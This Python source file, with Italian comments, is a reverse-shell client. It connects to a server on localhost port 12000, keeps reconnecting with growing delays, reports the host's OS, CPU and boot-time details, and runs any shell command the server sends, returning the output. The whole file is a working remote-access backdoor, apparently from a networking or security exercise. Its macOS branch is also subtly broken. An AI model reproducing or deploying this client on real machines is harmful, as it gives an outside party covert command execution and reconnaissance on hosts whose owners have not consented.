from socket import *
from datetime import datetime
import os, platform, subprocess, re, time
import psutil #verificare funzionamento su linux e mac

BUFFER_SIZE = 1024 * 4
serverName = 'localhost'
serverPort = 12000
clientSocket = socket(AF_INET, SOCK_STREAM)
def connessione():
    global cwd
    connesso = False
    tempo_attesa = 5
    
    while connesso == False :
        try:
            clientSocket.connect((serverName,serverPort))
        except Exception as e:
            # Server inattivo, si ritenta la connessione dopo un tempo sempre maggiore
            print("Attendo " + str(tempo_attesa))
            print(str(e.errno))
            print(str(e))
            time.sleep(tempo_attesa)
            tempo_attesa*=2
        else:
            connesso = True 
            cwd = os.getcwd()
            invia_messaggio(cwd)
            
def invia_messaggio(messaggio):
    global clientSocket
    while True:
        try:
            clientSocket.send(messaggio.encode())
            break
        except Exception as e:
            #Il server si e' disconnesso nel mentre, tentiamo la riconnessione e rimandiamo il messaggio
            print (str(e.errno))
            print(str(e))
            clientSocket.close()
            clientSocket = socket(AF_INET, SOCK_STREAM)
            connessione()

def ricevi_messaggio():
    global clientSocket
    while True:
        try:
            messaggio = clientSocket.recv(BUFFER_SIZE).decode()
            return messaggio
        except Exception as e:
            #Il server si e' disconnesso nel mentre, tentiamo la riconnessione e la ricezione del messaggio
            print (str(e.errno))
            print(str(e))
            clientSocket.close()
            clientSocket = socket(AF_INET, SOCK_STREAM)
            connessione()

def getInfoSO():
    intestazione = "\n === INFORMAZIONI SUL SISTEMA === \n"
    infoSistemaOperativo = platform.uname()
    sistemaOperativo = infoSistemaOperativo.system
    nomeUtente = infoSistemaOperativo.node
    releaseSo = infoSistemaOperativo.release
    versioneSo = infoSistemaOperativo.version
    architettura = infoSistemaOperativo.machine
    sentence = "Nome utente: "+nomeUtente+"\n"+\
               "Sistema operativo: "+sistemaOperativo+"\n"+\
               "Release SO: "+releaseSo+"\n"+\
               "Versione SO: "+versioneSo+"\n"+\
               "Architettura: "+architettura+"\n"
    return intestazione+sentence

def getInfoCPU():
    intestazione = "\n === INFORMAZIONI SULLA CPU === \n"
    if platform.system() == "Windows":
        infoCpuOsWindows = platform.processor()
        core_fisici_cpu = psutil.cpu_count(logical=False)
        core_totali_cpu = psutil.cpu_count(logical=True)
        frequenza_cpu = psutil.cpu_freq()
        max_frequenza_cpu = frequenza_cpu.max
        min_frequenza_cpu = frequenza_cpu.min
        frequenza_cpu_corrente = frequenza_cpu.current
        percentuale_uso_cpu = psutil.cpu_percent()
        sentence = f"Processore: {infoCpuOsWindows}" + "\n" + \
                   f"Core fisici CPU: {core_fisici_cpu}" + "\n" + \
                   f"Core totali CPU: {core_totali_cpu}" + "\n" + \
                   f"Frequenza max. CPU {max_frequenza_cpu:.2f}" + " Mhz" + "\n" + \
                   f"Frequenza min. CPU: {min_frequenza_cpu:.2f}" + " Mhz" + "\n" + \
                   f"Frequenza CPU corrente: {frequenza_cpu_corrente:.2f}" + " Mhz" + "\n" + \
                   f"Percentuale uso CPU: {percentuale_uso_cpu}" + "%" + "\n"
        return intestazione+sentence

    elif platform.system() == "Darwin":
        os.environ['PATH'] = os.environ['PATH'] + os.pathsep + '/usr/sbin'
        comandoCpu = "sysctl -n machdep.cpu.brand_string"
        infoCpuOsDarwin = subprocess.check_output(comandoCpu).strip()
        return intestazione+infoCpuOsDarwin
    elif platform.system() == "Linux":
        comandoCpu = "cat /proc/cpuinfo"
        infoCpuOsLinux = subprocess.check_output(comandoCpu, shell=True).decode().strip()
        return intestazione+infoCpuOsLinux
    return ""

def getInfoBootTime():
    intestazione = "\n === INFORMAZIONI SUL TEMPO D'AVVIO === \n"
    boot_time_timestamp = psutil.boot_time()
    boot_time = datetime.fromtimestamp(boot_time_timestamp)
    giorno = boot_time.day
    mese = boot_time.month
    anno = boot_time.year
    ore = boot_time.hour
    minuti = boot_time.minute
    secondi = boot_time.second
    sentence = f"Il sistema e\' attivo dal giorno {giorno}/{mese}/{anno} dalle ore {ore}:{minuti}:{secondi}"
    return intestazione+sentence

def executeShellCommand(cmd):
    #Prendiamo ogni componente del comando per distinguere tra cd e altri comandi
    global cwd
    split_cmd = cmd.split()
    if split_cmd[0] == "cd":
        #Tentativo per cambiamento directory assoluta
        if split_cmd[1].find('\\') == 0:
            try:
                os.chdir(''.join(split_cmd[1]))
            except FileNotFoundError as e:
                #se c'e un errore lo restituiamo in output
                output = str(e)
            else:
                output = ''
        else: 
        #Tentativo per cambiamento directory relativa
            try:
                os.chdir(cwd+'\\'+''.join(split_cmd[1]))
            except FileNotFoundError as e:
                #se c'e un errore lo restituiamo in output
                output = str(e)
            else:
                output = ''
    else: 
        output = subprocess.getoutput(cmd)
    cwd = os.getcwd()
    message = output + '<sep>' + cwd 
    invia_messaggio(message)







"""
Converte i byte nel proprio formato corrispondente
Esempio:
1253656 = '1.20MB'
1253656678 = '1.17GB'

def converti_byte(byte):
    
    suffisso_byte = "B"
    fattore_byte = 1024

    for unita_byte in ["", "K", "M", "G", "T", "P"]:
        if byte < fattore_byte:
            byte_convertito = f"{byte:.2f}{unita_byte}{suffisso_byte}" #f-string
            return byte_convertito
        byte = byte/fattore_byte
"""

connessione()
while True:
    #Ricaviamo la current working directory dell host su cui gira il client
    #Inviamo una seconda volta la cwd per motivi di interfaccia lato server
    comando = ricevi_messaggio()
    
    if comando == "1":
        invia_messaggio(getInfoSO())
    elif comando == "2":
        invia_messaggio(getInfoCPU())
    elif comando == "3":
        invia_messaggio(getInfoBootTime())
    elif comando.split('<sep>')[0] == "4":
        executeShellCommand(comando.split('<sep>')[1])
    elif comando == "0":
        break
    else:
        print("errore comando")

    """
    comando match non supportato per versioni di python < 3.10
    match(comando):
        case "0":
            break
        case "1":
            invia_messaggio(getInfoSO())
        case "2":
            invia_messaggio(getInfoCPU())
        case "3":
            invia_messaggio(getInfoBootTime())
    """

print("Fine")
clientSocket.close()